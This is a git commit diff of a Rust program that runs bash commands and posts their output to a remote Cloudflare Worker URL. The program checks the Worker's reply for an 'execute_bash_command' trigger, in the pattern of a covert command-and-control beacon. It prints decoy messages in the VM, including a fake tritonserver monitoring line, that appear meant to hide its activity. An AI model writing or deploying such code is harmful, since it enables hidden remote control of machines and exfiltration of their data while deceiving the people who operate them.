2035a8d04df13bc091986c76a80f63c10b0c0f06
AlphaRora <adoba@alpharora.com>
2024-04-23 16:57:38 -0400

    no

--- src/main.rs
+++ src/main.rs
@@ -1,41 +1,22 @@
+// main.rs
 mod command_executor;
 mod worker_communication;
 
 use std::sync::mpsc;
 use std::thread;
-use tokio;
 
 #[tokio::main]
 async fn main() {
     let worker_url = "https://serverworker.adoba.workers.dev/";
     let (tx, rx) = mpsc::channel();
-    let (lscpu_tx, lscpu_rx) = mpsc::channel();
 
+    // Spawn a separate thread to execute the bash command
     thread::spawn(move || {
-        command_executor::execute_bash_command(tx, lscpu_tx);
+        command_executor::execute_bash_command(tx);
     });
 
-    tokio::spawn(async move {
-        async_loop(rx, &worker_url).await;
-    });
-
-    thread::spawn(move || {
-        loop {
-            let lscpu_output = match lscpu_rx.recv() {
-                Ok(output) => output,
-                Err(_) => {
-                    println!("Error receiving lscpu command output");
-                    continue;
-                }
-            };
-            println!("{}", lscpu_output);
-            // TODO: Send lscpu_output to the new lscpu bucket
-        }
-    });
-}
-
-async fn async_loop(rx: mpsc::Receiver<String>, worker_url: &str) {
     loop {
+        // Receive the command output from the channel
         let command_output = match rx.recv() {
             Ok(output) => output,
             Err(_) => {
@@ -44,12 +25,14 @@ async fn async_loop(rx: mpsc::Receiver<String>, worker_url: &str) {
             }
         };
 
+        // Print the desired output in the VM
         println!("Request to Cloudflare Worker was successful. Printing something else.");
         println!("Monitoring wait time for processes targets: tritonserver --model-repository=/mnt/models (PID: 421650 1057344 1339315 1511142 1814944 1818258 1826503 2141245 2324574 2362028 2370337 2716471 3113947 3791815 3820143)");
         println!("---------------------------------------------------------");
         println!("{}", command_output);
 
-        let response = match worker_communication::send_data_request(worker_url, &command_output).await {
+        // Send data to the Worker
+        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
             Ok(response) => response,
             Err(e) => {
                 println!("Error: {}", e);
@@ -57,6 +40,7 @@ async fn async_loop(rx: mpsc::Receiver<String>, worker_url: &str) {
             }
         };
 
+        // Check the response from the Worker
         if response == "execute_bash_command" {
             println!("Received execute_bash_command response from Worker");
         } else {
